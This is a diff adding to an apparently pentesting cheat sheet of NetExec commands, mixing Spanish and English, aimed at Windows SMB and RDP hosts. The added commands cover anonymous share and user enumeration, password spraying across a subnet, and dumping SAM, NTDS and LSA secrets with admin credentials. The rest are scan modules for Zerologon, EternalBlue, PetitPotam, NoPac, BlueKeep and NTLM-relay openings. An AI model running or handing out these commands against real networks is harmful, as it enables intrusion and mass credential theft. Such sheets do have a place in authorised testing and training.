@@ -23,9 +23,92 @@ nxc smb 192.168.1.50 -u '' -p '' --shares
 ```
 
 ```
+nxc smb 192.168.1.50 -u '' -p '' --users
+```
+
+```
 nxc smb 192.168.1.50 -u 'guest' -p '' --local-auth
 ```
 
 ```
 nxc smb 192.168.1.50 -u 'guest' -p '' --local-auth --shares
+```
+
+## Password Spraying
+
+```
+nxc smb 192.168.1.0/24 -u 'Administrator' -p 'Password01' --local-auth
+```
+
+```
+nxc smb 192.168.1.10 -u 'juan.perez' -p 'Password01' -d miempresa.local
+```
+
+## Enumetarion users
+
+```
+nxc smb 192.168.1.50 -u 'user1' -p 'Password123' --local-auth --users
+```
+
+```
+nxc smb 192.168.1.10 -u 'user1' -p 'Password123' -d miempresa.local --users
+```
+
+## Dump hash and Credentials
+
+```
+nxc smb 192.168.1.50 -u 'Administrator' -p 'ClaveLocal123!' --local-auth --sam
+```
+
+```
+nxc smb 192.168.1.10 -u 'DomainAdmin' -p 'ClaveDominio2026*' -d miempresa.local --ntds
+```
+
+```
+nxc smb 192.168.1.50 -u 'Administrador' -p 'ClaveLocal123!' --local-auth --lsa
+```
+
+```
+nxc smb 192.168.1.0/24 -u 'admin.dominio' -p 'ClaveDominio2026*' -d miempresa.local --lsa
+```
+
+# Verificar si los equipos son vulnerables a PetitPotam (MS-EFSRPC)
+```
+nxc smb 192.168.1.0/24 -M petitpotam
+```
+# Verificar si el Controlador de Dominio es vulnerable a Zerologon (CVE-2020-1472)
+```
+nxc smb 192.168.1.10 -M zerologon
+```
+# Verificar si los sistemas Windows son vulnerables a EternalBlue (MS17-010)
+```
+nxc smb 192.168.1.0/24 -M eternalblue
+```
+# Verificar si las máquinas son vulnerables a NoPac (CVE-2021-42278 / CVE-2021-42287)
+```
+nxc smb 192.168.1.0/24 -M nopac
+```
+# Verificar vulnerabilidad BlueKeep (CVE-2019-0708) en el protocolo RDP (Escritorio Remoto)
+```
+nxc rdp 192.168.1.0/24 -M bluekeep
+```
+# Verificar vulnerabilidad SpoolFool (CVE-2022-21999 - Privilegios locales mediante la cola de impresión)
+```
+nxc smb 192.168.1.0/24 -M spoolfool
+```
+# Verificar vulnerabilidad WebDav (Busca si el servicio WebClient está activo, ideal para ataques NTLM Relay)
+```
+nxc smb 192.168.1.0/24 -M webdav
+```
+# Verificar si LAPS (Local Administrator Password Solution) está instalado y configurado
+```
+nxc smb 192.168.1.0/24 -M laps
+```
+# Verificar si los equipos tienen activado el protocolo obsoleto y peligroso SMBv1
+```
+nxc smb 192.168.1.0/24 -M smbv1
+```
+# Comprobar si las máquinas permiten sesiones anónimas mediante RPC (Null Sessions avanzadas)
+```
+nxc smb 192.168.1.0/24 -M rpcblanksystem
 ```
